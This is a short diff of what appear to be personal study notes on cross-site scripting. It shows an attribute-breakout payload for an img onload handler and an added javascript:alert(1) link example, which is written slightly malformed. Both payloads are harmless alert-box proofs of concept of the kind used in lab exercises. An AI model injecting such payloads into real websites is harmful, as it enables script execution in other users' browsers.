@@ -663,3 +663,8 @@ Orginal code --> <img src="/static/loading.gif" onload="startTimer('3');" />
 payload --> '); alert('1
 
 final result --> onload="startTimer(''); alert('1');" />
+___________________________________________________________________________________________________________________________________________________________________
+How to do XSS in <a href ""></a>
+---------------------------------
+
+<a href "javascript:alert(1)"
